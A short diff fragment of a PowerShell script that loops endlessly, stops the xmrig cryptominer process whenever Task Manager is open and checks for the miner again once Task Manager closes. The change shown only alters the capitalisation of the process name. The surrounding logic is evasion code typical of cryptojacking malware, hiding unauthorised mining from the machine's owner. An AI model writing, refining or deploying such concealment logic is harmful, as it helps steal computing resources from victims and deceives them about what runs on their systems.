@@ -7,14 +7,14 @@ while ($true){
     try {
         Get-Process taskmgr -ErrorAction Stop
         $ativotask = $true
-        try{Stop-Process -name xmrig -ErrorAction Stop}
+        try{Stop-Process -name Xmrig -ErrorAction Stop}
         catch{}
         $ativoprocess = $false 
     }
     catch {
        $ativotask = $false 
        try{
-            Get-Process xmrig -ErrorAction Stop
+            Get-Process Xmrig -ErrorAction Stop
             $ativoprocess = $true
        }
        catch{
